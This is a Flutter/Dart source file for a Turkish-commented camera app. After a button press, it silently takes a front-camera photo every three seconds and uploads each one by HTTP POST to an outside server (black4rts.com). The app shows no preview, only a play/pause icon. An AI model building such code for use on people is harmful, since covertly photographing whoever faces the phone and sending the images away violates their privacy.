// ignore_for_file: avoid_print, prefer_const_constructors, unused_import

import 'dart:async';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:camera/camera.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  final frontCamera = await getFrontCamera();

  runApp(MaterialApp(
    home: CameraApp(
      camera: frontCamera,
    ),
  ));
}

Future<CameraDescription> getFrontCamera() async {
  final cameras = await availableCameras();
  final frontCamera = cameras.firstWhere(
    (camera) => camera.lensDirection == CameraLensDirection.front,
    orElse: () => cameras.first,
  );
  return frontCamera;
}

class CameraApp extends StatefulWidget {
  final CameraDescription camera;

  // ignore: use_key_in_widget_constructors
  const CameraApp({required this.camera});

  @override
  State createState() => CameraAppState();
}

class CameraAppState extends State<CameraApp> {
  late CameraController controller;
  bool isRecording = false;
  Timer? timer;

  @override
  void initState() {
    super.initState();
    controller = CameraController(widget.camera, ResolutionPreset.medium);
    controller.initialize().then((_) {
      if (!mounted) {
        return;
      }
      setState(() {});
    });
  }

  @override
  void dispose() {
    controller.dispose();
    super.dispose();
  }

  void startStopRecording() {
    if (isRecording) {
      if (timer != null) {
        timer!.cancel();
      }
    } else {
      // Başlama zamanı
      takePicture();

      // Her 5 saniyede bir fotoğraf çek
      timer = Timer.periodic(const Duration(seconds: 3), (Timer t) {
        takePicture();
      });
    }
    setState(() {
      isRecording = !isRecording;
    });
  }

  Future<void> takePicture() async {
    if (!controller.value.isInitialized) {
      return;
    }

    final image = await controller.takePicture();
    final file = File(image.path);

    // Dosya adını 1.jpg olarak ayarlayın
    final newFilePath = file.path.replaceFirst(RegExp(r'[^\/]*$'), '1.jpg');
    // ignore: unused_local_variable
    final newFile = file.renameSync(newFilePath);

    // Yüklemek istediğiniz URL'yi burada değiştirin
    final url = Uri.parse('https://black4rts.com/upload/index.php');

    // Fotoğrafı HTTP POST ile gönderin
    final request = http.MultipartRequest('POST', url)
      ..files.add(await http.MultipartFile.fromPath('file', newFilePath));
    final response = await request.send();

    if (response.statusCode == 200) {
      print('Dosya başarıyla yüklendi.');
    } else {
      print('Dosya yüklerken hata oluştu. Hata kodu: ${response.statusCode}');
    }
  }

  @override
  Widget build(BuildContext context) {
    if (!controller.value.isInitialized) {
      return Container();
    }
    return Scaffold(
      appBar: AppBar(
        title: const Text('Kamera Uygulaması'),
      ),
      body: Center(
        child: isRecording
            ? Icon(
                Icons.pause,
                size: 80,
                color: Colors.red,
              )
            : Icon(
                Icons.play_arrow,
                size: 80,
                color: Colors.green,
              ),
      ),
      floatingActionButton: FloatingActionButton(
        onPressed: startStopRecording,
        child: isRecording ? Icon(Icons.pause) : Icon(Icons.play_arrow),
      ),
    );
  }
}
